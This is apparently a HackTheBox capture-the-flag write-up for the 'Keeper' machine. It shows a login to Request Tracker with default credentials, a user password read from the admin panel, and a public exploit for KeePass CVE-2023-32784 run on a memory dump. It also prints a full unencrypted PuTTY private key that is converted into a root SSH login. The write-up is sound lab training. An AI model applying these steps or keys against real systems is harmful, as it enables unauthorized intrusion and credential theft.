---
title: Keeper
tags:
  - HackTheBox
  - Easy
  - Linux
  - Best_Practical_Ticket_Management
  - Keepass
  - CVE
  - Dotnet
  - Putty
date: 2025-02-17T00:00:00Z
---
![](Pasted%20image%2020250217174935.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.227 keeper.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- keeper.htb > sC.txt

[redacted]
PORT   STATE SERVICE
```

So I checked its website:

![](Pasted%20image%2020250217180159.png)

So I'll add the new domain `tickets.keeper.htb` to my known ones:

![](Pasted%20image%2020250217180318.png)

A new login panel is shown using a software called "**Best Practical**".

## Weaponization

I searched info about it in Google and got [Best Practical Official Website](https://bestpractical.com/):

>[!Info]
>*The leading, open source, enterprise-level **ticket** **management** system. Organizations of all sizes use Request Tracker to track and **manage** workflows, customer requests, and internal project tasks of all sorts.*

I searched for default passwords and got them from [Open-sez.me](https://open-sez.me/default-passwords-bestpractical.html): `root:password`, which worked:

![](Pasted%20image%2020250217180719.png)

## Reconnaissance x2

I noticed something inside the queue:

![](Pasted%20image%2020250217180908.png)

It seems to be a problem related to Keepass:

![](Pasted%20image%2020250217180930.png)

![](Pasted%20image%2020250217180952.png)

I didn't find anything useful here, so I checked the endpoint `http://tickets.keeper.htb/rt/Admin/Users/` in spite of finding credentials:

![](Pasted%20image%2020250217181404.png)

> Got credentials from user lnorgaard :D `lnorgaard:Welcome2023!`

![](Pasted%20image%2020250217181440.png)

### User flag

![](Pasted%20image%2020250217181654.png)

## Privilege Escalation

There is a `.zip` inside of `lnorgaard`'s home directory, so I'll unzip it:

![](Pasted%20image%2020250217181933.png)

I'll save the `passcodes.kdbx` to my machine and try to crack the master password with john:

```shell
# In my machine
scp -P 22 lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx ./passcodes.kdbx

keepass2john passcodes.kdbx > dataset.john
john dataset.john
```

After a long time I didn't get anything, so I searched breaches over the internet and got [CVE-2023-32784](https://bleekseeks.com/blog/keepass-master-password-exploit-cve-2023-32784-poc).
- [Link to the Original Keepass password dumper](https://github.com/vdohney/keepass-password-dumper)

```shell
git clone https://github.com/vdohney/keepass-password-dumper.git

# I'll download the full zip to get the .dmp also
scp -P 22 lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip ./RT30000.zip
unzip RT30000.zip

# Then execute the exploit
cd keepass-password-dumper
dotnet run ../KeePassDumpFull.dmp
```

>[!Error]
>![](Pasted%20image%2020250217184131.png)

I need to install a higher version of dotnet:

```shell
curl -Lo dotnet.tar.gz https://download.visualstudio.microsoft.com/download/pr/f5c74056-330b-452b-915e-d98fda75024e/18076ca3b89cd362162bbd0cbf9b2ca5/dotnet-sdk-7.0.100-rc.2.22477.23-linux-x64.tar.gz
mkdir dotnet
tar -C dotnet -xf dotnet.tar.gz
rm dotnet.tar.gz
mv dotnet/ ~
```

Now run it with a newer version:

```shell
~/dotnet/dotnet run ../KeePassDumpFull.dmp

[redacted]
dgrød med fløde
```

![](Pasted%20image%2020250217190452.png)

Now to open this database we need to install `kpcli` (to work with older versions of `.kdbx` files):

```shell
sudo apt install kpcli -y

kpcli

kpcli:/> open ../passcodes.kdbx
```

![](Pasted%20image%2020250217190810.png)

I'll search for `dgrød med fløde`:

![](Pasted%20image%2020250217190926.png)

So I think that the password isn't correct at all and might be `rødgrød med fløde`:

![](Pasted%20image%2020250217191142.png)

> We're in!

So now we just have to find root password:

```shell
cd Network
show -f 0

[redacted]
PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

There is a Putty id-rsa inside of it. So I'll download [Puttygen](https://www.puttygen.com/#gsc.tab=0):

```shell
sudo apt install putty-tools

echo "PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0" > ssh_putty_key
```

Then execute **puttygen** to generate an id_rsa:

```shell
puttygen ssh_putty_key -O private-openssh -o id_rsa
```

- `-O` means the output format
- `-o` is the output file

Now connect to the machine:

```shell
chmod 400 id_rsa
ssh -i id_rsa root@keeper.htb
```

![](Pasted%20image%2020250217192235.png)

### Root flag

![](Pasted%20image%2020250217192321.png)

==Machine pwned!==










